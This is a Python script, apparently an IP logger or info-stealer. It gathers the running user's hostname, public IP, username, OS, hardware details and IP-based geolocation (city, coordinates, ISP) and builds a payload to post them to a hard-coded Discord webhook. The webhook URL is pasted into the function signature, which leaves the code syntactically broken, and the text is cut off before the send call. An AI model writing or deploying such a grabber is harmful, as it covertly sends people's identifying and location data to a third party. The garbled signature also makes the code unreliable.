import os
import socket
import platform
import psutil
import requests

def get_ip_info(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            data = response.json()
            loc = data.get("loc", "N/A")
            latitude, longitude = loc.split(",") if loc != "N/A" else ("N/A", "N/A")
            area_code = data.get("phone", "N/A")
            if area_code == "N/A":
                area_code = "Area code not available."
            return {
                "IP": data.get("ip", "N/A"),
                "City": data.get("city", "N/A"),
                "Region": data.get("region", "N/A"),
                "Country": data.get("country", "N/A"),
                "Latitude": latitude,
                "Longitude": longitude,
                "Area Code": area_code,
                "ISP": data.get("org", "N/A"),
            }
    except Exception as e:
        print(f"Error fetching IP information: {e}")
    return None

def get_system_info():
    hostname = socket.gethostname()

    try:
        ip_address = requests.get('https://api64.ipify.org').text
        ip_info = get_ip_info(ip_address)
        city = ip_info.get("City", "N/A")
        state = ip_info.get("Region", "N/A")
        area_code = ip_info.get("Area Code", "N/A")
        country = ip_info.get("Country", "N/A")
        latitude = ip_info.get("Latitude", "N/A")
        longitude = ip_info.get("Longitude", "N/A")
        isp = ip_info.get("ISP", "N/A")
    except (socket.error, requests.RequestException):
        ip_address = "Unable to determine IP"
        city = state = area_code = country = latitude = longitude = isp = "N/A"

    username = os.getlogin()

    os_info = platform.system() + " " + platform.release()

    processor_type = platform.processor()

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    memory_usage = f"{memory_info.percent}%"

    memory_size = f"{round(memory_info.total / (1024 ** 3), 2)} GB"

    monitoring_info = {
        "Hostname": hostname,
        "IP Address": ip_address,
        "Username": username,
        "Operating System": os_info,
        "Processor": processor_type,
        "CPU Usage": f"{cpu_usage}%",
        "Memory Usage": memory_usage,
        "Memory Size": memory_size
    }

    good_info = {
        "City": city,
        "State": state,
        "Area Code": area_code,
        "Country": country,
        "Latitude": latitude,
        "Longitude": longitude,
        "ISP": isp
    }

    return monitoring_info, good_info

def send_to_discord(webhook_urlhttps://discord.com/api/webhooks/1344436385431552011/kiy0DcN5VYWjX3kB5s7LjCzaYxmc9hjMcDhOU_SwV8gr23RmChZKexsXPUbe38rGep61, monitoring_info, good_info):
    monitoring_message = "\n".join([f"**{key}:** {value}" for key, value in monitoring_info.items()])
    good_info_message = "\n".join([f"**{key}:** {value}" for key, value in good_info.items()])

    payload = {
        "content": "System Information:",
        "embeds": [
            {
                "title": "Monitoring Update",
                "description": monitoring_message,
                "color": 2624675  # Hex color #0028b3 (darker blue)
            },
            {
                "title": "Good Info",
                "description": good_info_message,
                "color": 11259336  # Hex color #ac03c8 (purple)
            }
        ]
... (16 lines left)
